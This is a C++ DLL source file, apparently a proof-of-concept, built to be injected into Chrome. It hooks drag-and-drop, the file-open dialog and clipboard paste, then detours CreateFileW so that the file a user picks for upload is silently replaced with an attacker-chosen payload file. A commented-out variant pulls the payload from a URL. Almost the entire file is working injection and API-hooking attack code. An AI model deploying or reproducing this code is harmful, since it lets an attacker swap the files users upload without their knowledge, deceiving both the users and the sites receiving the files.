// dllmain.cpp : Defines the entry point for the DLL application.
#include "framework.h"

#define TARGETWINDOW L"Chrome_WidgetWin_1"
#define PAYLOADFILE  L"C:\\Your\\payload\\path\\here"
//#define PAYLOADFILE L"http://127.0.0.1:8080/payload.txt" 

void GenRandomString(wchar_t* s, const int len)
{
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	for (int i = 0; i < len; ++i) {
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}
	s[len] = 0;
}

DWORD WINAPI WriteToPipe(PTHREAD_PARAM pTP) {
	DWORD dwWritten;
	WriteFile(pTP->hWritePipe, pTP->lpBuffer, BUFFER_SIZE, &dwWritten, NULL);
	return 0;
}

HANDLE _CreateFileW(
	LPCWSTR               lpFileName,
	DWORD                 dwDesiredAccess,
	DWORD                 dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD                 dwCreationDisposition,
	DWORD                 dwFlagsAndAttributes,
	HANDLE                hTemplateFile
) {
	HANDLE hFile;
	if (!lstrcmpiW(DragFileW, lpFileName)) {
		//MessageBoxA(NULL, "CreateFile for DragFile is found!", "_CreateFileW", 0);
		WCHAR FakeFile[MAX_PATH] = PAYLOADFILE;
		hFile = pCreateFileW(FakeFile, dwDesiredAccess, dwShareMode,
			lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
		//HANDLE hWrite;
		//CreatePipe(&hFile, &hWrite, NULL, 0);
		//THREAD_PARAM tp = { tp.hWritePipe = hWrite };
		//tp.lpBuffer = VirtualAlloc(NULL, BUFFER_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		//GetPayloadFromURL((LPWSTR)PAYLOADFILE, tp.lpBuffer, BUFFER_SIZE);
		//MessageBoxA(0, "Creating WriteToPipe thread!", "_CreateFileW", MB_OK);
		//CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WriteToPipe, &tp, 0, NULL);
		////Need to wait for thread creation
		//Sleep(1000);
		return hFile;
	}
	return pCreateFileW(lpFileName, dwDesiredAccess, dwShareMode,
		lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

BOOL HookCreateFile() {
	CHAR message[MAX_PATH] = { 0 };
	HMODULE hModule = GetModuleHandle(L"kernelbase.dll");

	LPVOID lpCreateFileA = GetProcAddress(hModule, "CreateFileA");
	LPVOID lpCreateFileW = GetProcAddress(hModule, "CreateFileW");

	//sprintf_s(message, MAX_PATH - 1, "Original CreateFileA address: %lp", lpCreateFileA);
	//MessageBoxA(NULL, message, "HookCreateFile", 0);

	RtlCopyMemory(&pCreateFileA, &lpCreateFileA, 8);
	RtlCopyMemory(&pCreateFileW, &lpCreateFileW, 8);

	//MessageBoxA(NULL, "API Hooking started!", "HookCreateFile", 0);

	DetourRestoreAfterWith();
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());

	//Hook functions with detours 
	DetourAttach(&(PVOID&)pCreateFileW, _CreateFileW);

	LONG lError = DetourTransactionCommit();
	if (lError != NO_ERROR) {
		MessageBox(HWND_DESKTOP, L"Failed to detour", L"HookCreateFile", MB_OK);
		return FALSE;
	}

	return TRUE;
}

BOOL DetachHooks() {
	DetourUpdateThread(GetCurrentThread());

	//Hook functions with detours 
	//DetourDetach(&(PVOID&)pCreateFileA, _CreateFileA);
	DetourDetach(&(PVOID&)pCreateFileW, _CreateFileW);

	LONG lError = DetourTransactionCommit();
	if (lError != NO_ERROR) {
		MessageBox(HWND_DESKTOP, L"Failed to detach hooks", L"DetachHooks", MB_OK);
		return FALSE;
	}
	return TRUE;
}

//IDropTarget::Drop() Trampoline
static HRESULT _Drop(
	LPVOID lpDropTarget,
	IDataObject* pDataObj,
	DWORD       grfKeyState,
	POINTL      pt,
	DWORD* pdwEffect
) {
	CHAR message[MAX_PATH] = { 0 };
	HRESULT hres;
	STGMEDIUM stgmedium;
	HDROP hdrop;
	FORMATETC formatetc = { 0 };
	formatetc.cfFormat = CF_HDROP;
	formatetc.dwAspect = DVASPECT_CONTENT;
	formatetc.tymed = TYMED_HGLOBAL;
	formatetc.lindex = -1;
	formatetc.ptd = NULL;

	if (SUCCEEDED(hres = pDataObj->GetData(&formatetc, &stgmedium))) {
		//MessageBoxA(NULL, "GetData succeeded!", "dropfunc", 0);
	}
	else {
		sprintf_s(message, MAX_PATH - 1, "GetData  Failed: %lp", hres);
		MessageBoxA(NULL, message, "_Drop", 0);
		//returns DV_E_FORMATETC whan failed
	}

	hdrop = (HDROP)stgmedium.hGlobal;
	DragQueryFileW(hdrop, 0, DragFileW, MAX_PATH);
	ZeroMemory(message, MAX_PATH);
	sprintf_s(message, MAX_PATH - 1, "Dropped File: %ws", DragFileW);
	MessageBoxA(NULL, message, "_Drop", 0);

	HookCreateFile();

	return pOrigDrop(lpDropTarget, pDataObj, grfKeyState, pt, pdwEffect);
}


extern "C" __declspec(dllexport) int HookIDropTarget() {
	HWND hw;
	DWORD dwPrt;
	PBYTE lpDrop;
	CHAR message[MAX_PATH] = { 0 };
	LONGLONG lpHookDrop = 0;

	IDropTarget* pDropTarget;

	MessageBoxA(NULL, "HookIDropTarget is started!", "HookIDropTarget", 0);

	//Find IDropTarget*
	hw = FindWindow(TARGETWINDOW, NULL);
	pDropTarget = (IDropTarget*)GetProp(hw, L"OleDropTargetInterface");

	//Get pDropTarget->Drop() address from vtable
	RtlCopyMemory(&lpDrop, pDropTarget, 8);
	lpDrop += 0x30;

	sprintf_s(message, MAX_PATH - 1, "IDropTarget Address: %lp", *pDropTarget);
	MessageBoxA(NULL, message, "HookIDropTarget", 0);

	//Save original function addresses
	RtlCopyMemory(&pOrigDrop, lpDrop, 8);

	// Hook IDropTarget::Drop function
	lpHookDrop = (LONGLONG)_Drop;
	VirtualProtect(lpDrop, 8, PAGE_EXECUTE_READWRITE, &dwPrt);
	RtlCopyMemory(lpDrop, &lpHookDrop, 8);

	MessageBoxA(NULL, "IDropTarget::Drop() is hooked", "HookIDropTarget", 0);

	return 0;
}

/// <summary>
/// File Dialog Hooking
/// </summary>

IFileDialog* pFileDialog = NULL;

// Original 
HRESULT(WINAPI* pCoCreateInstance)(
	REFCLSID  rclsid,
	LPUNKNOWN pUnkOuter,
	DWORD     dwClsContext,
	REFIID    riid,
	LPVOID* ppv
	);

// Original
HRESULT(*pShow)(
	LPVOID lpFileDialog,
	HWND hwndOwner
	);

// Trampoline
static HRESULT _Show(
	IFileDialog* lpFileDialog,
	HWND hwndOwner
) {
	HRESULT hRes, hRes2;
	MessageBoxA(NULL, "Hello From _Show()", "_Show", 0);
	hRes = pShow(lpFileDialog, hwndOwner);
	// call pfd->GetResult() to get filename
	if (SUCCEEDED(hRes)) {
		IShellItem* psiResult;
		//hRes = (HRESULT(*)(IShellItem*))(lpFileDialog+0xA0)(&psiResult);
		//hRes2 = pFileDialog->GetResult(&psiResult);
		hRes2 = lpFileDialog->GetResult(&psiResult);
		if (SUCCEEDED(hRes2))
		{
			// We are just going to print out the 
			// name of the file for sample sake.
			PWSTR pszFilePath = NULL;
			hRes2 = psiResult->GetDisplayName(SIGDN_FILESYSPATH,
				&pszFilePath);
			wsprintf(DragFileW, pszFilePath);
			//MessageBoxW(NULL, pszFilePath, L"_Show", 0);
			MessageBoxW(NULL, DragFileW, L"_Show", 0);
		}
		// Hook CreateFileA
		HookCreateFile();

	}
	return hRes;
}

// Trampoline
HRESULT _CoCreateInstance(
	REFCLSID  rclsid,
	LPUNKNOWN pUnkOuter,
	DWORD     dwClsContext,
	REFIID    riid,
	LPVOID* ppv
) {
	HRESULT hRes = pCoCreateInstance(rclsid, pUnkOuter, dwClsContext, riid, ppv);

	if (IsEqualCLSID(CLSID_FileOpenDialog, rclsid)) {
		// Found IFileDialog instance call
		// Hook IFileDialog->Show() and call pfd->GetResult() after call
		//__debugbreak();
		CHAR message[MAX_PATH] = { 0 };
		//RtlCopyMemory(&IID_PPV_ARGS(&pFileDialog), &ppv, 8);
		pFileDialog = (IFileDialog*)*ppv;

		sprintf_s(message, MAX_PATH - 1, "IFileDialog* Address: %lp", pFileDialog);
		MessageBoxA(NULL, message, "_CoCreateInstance", 0);

		// Find IFileDialog->Show address from IFileDialog*
		// IFileDialog->Show vtable index 3	
		PBYTE lpShow;
		LONGLONG lpHookShow;
		RtlCopyMemory(&lpShow, pFileDialog, 8);
		lpShow += 0x18;
		sprintf_s(message, MAX_PATH - 1, "IFileDialog->Show() Address: %lp", lpShow);
		MessageBoxA(NULL, message, "_CoCreateInstance", 0);
		// Backup original address
		RtlCopyMemory(&pShow, lpShow, 8);
		// Overwrite 
		lpHookShow = (LONGLONG)_Show;
		//sprintf_s(message, MAX_PATH - 1, "Hooking func. _Show() Address: %lp", lpHookShow);
		//MessageBoxA(NULL, message, "_CoCreateInstance", 0);

		DWORD oldProtect;

		VirtualProtect(lpShow, 8, PAGE_EXECUTE_READWRITE, &oldProtect);
		RtlCopyMemory(lpShow, &lpHookShow, 8);

		MessageBoxA(NULL, "IFileDialog->Show is overwritten!", "_CoCreateInstance", 0);
	}

	return hRes;
}

extern "C" __declspec(dllexport) int HookCoCreateInstance() {
	// Hook CoCreateInstance and get IFileDialog *pfd
	HMODULE hModule = GetModuleHandle(L"ole32.dll");
	LPVOID lpCoCreateInstance = GetProcAddress(hModule, "CoCreateInstance");
	RtlCopyMemory(&pCoCreateInstance, &lpCoCreateInstance, 8);

	MessageBoxA(NULL, "Hooking CoCreateInstance call!", "HookCoCreateInstance", 0);

	DetourRestoreAfterWith();
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());

	DetourAttach(&(PVOID&)pCoCreateInstance, _CoCreateInstance);

	LONG lError = DetourTransactionCommit();
	if (lError != NO_ERROR) {
		MessageBox(HWND_DESKTOP, L"Failed to detour", L"detour", MB_OK);
		return FALSE;
	}

	return 0;
}

/// <summary>
/// Copy-Pasted File Hooking
/// </summary>

HANDLE _GetClipboardData(
	UINT uFormat
) {
	HGLOBAL hGlobal = pGetClipboardData(uFormat);
	if (uFormat == CF_HDROP) {
		MessageBoxA(NULL, "Hello from _GetClipboardData!", "_GetClipboardData", 0);
		WCHAR lpszFileName[MAX_PATH];

		HDROP hDrop = (HDROP)GlobalLock(hGlobal);
		UINT filenameLength = DragQueryFile(hDrop, 0, 0, 0);
		DragQueryFile(hDrop, 0, lpszFileName, filenameLength + 1);
		wsprintf(DragFileW, lpszFileName);
		MessageBoxW(NULL, DragFileW, L"_GetClipboardData", 0);
		GlobalUnlock(hGlobal);

		HookCreateFile();
	}
	return hGlobal;
}

HRESULT _OleGetClipboard(
	LPDATAOBJECT* ppDataObj
) {
	CHAR message[MAX_PATH] = { 0 };
	STGMEDIUM stgmedium;
	HDROP hdrop;
	FORMATETC formatetc = { 0 };
	formatetc.cfFormat = CF_HDROP;
	formatetc.dwAspect = DVASPECT_CONTENT;
	formatetc.tymed = TYMED_HGLOBAL;
	formatetc.lindex = -1;
	formatetc.ptd = NULL;

	HRESULT hres = pOleGetClipboard(ppDataObj);

	if (SUCCEEDED(((IDataObject*)ppDataObj)->GetData(&formatetc, &stgmedium))) {
		MessageBoxA(NULL, "GetData succeeded!", "_OleGetClipboard", 0);

		hdrop = (HDROP)stgmedium.hGlobal;
		DragQueryFileW(hdrop, 0, DragFileW, MAX_PATH);
		ZeroMemory(message, MAX_PATH);
		sprintf_s(message, MAX_PATH - 1, "Pasted File: %ws", DragFileW);
		MessageBoxA(NULL, message, "_OleGetClipboard", 0);

		HookCreateFile();
	}
	return hres;
}

extern "C" __declspec(dllexport) int HookCopyPaste() {
	HMODULE hModule = GetModuleHandle(L"user32.dll");
	HMODULE hModule2 = GetModuleHandle(L"ole32.dll");
	LPVOID lpGetClipboardData = GetProcAddress(hModule, "GetClipboardData");
	LPVOID lpOleGetClipboard = GetProcAddress(hModule2, "OleGetClipboard");
	RtlCopyMemory(&pGetClipboardData, &lpGetClipboardData, 8);
	RtlCopyMemory(&pOleGetClipboard, &lpOleGetClipboard, 8);

	MessageBoxA(NULL, "Hooking GetClipboardData and OleGetClipboard call!", "HookCopyPaste", 0);

	DetourRestoreAfterWith();
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());

	DetourAttach(&(PVOID&)pGetClipboardData, _GetClipboardData);
	//TODO: Fix bug in OleGetClipboard hook
	//DetourAttach(&(PVOID&)pOleGetClipboard, _OleGetClipboard);

	LONG lError = DetourTransactionCommit();
	if (lError != NO_ERROR) {
		MessageBox(HWND_DESKTOP, L"Failed to detour", L"detour", MB_OK);
		return FALSE;
	}

	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		//HookIDropTarget();
		HookCoCreateInstance();
		//HookCopyPaste();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

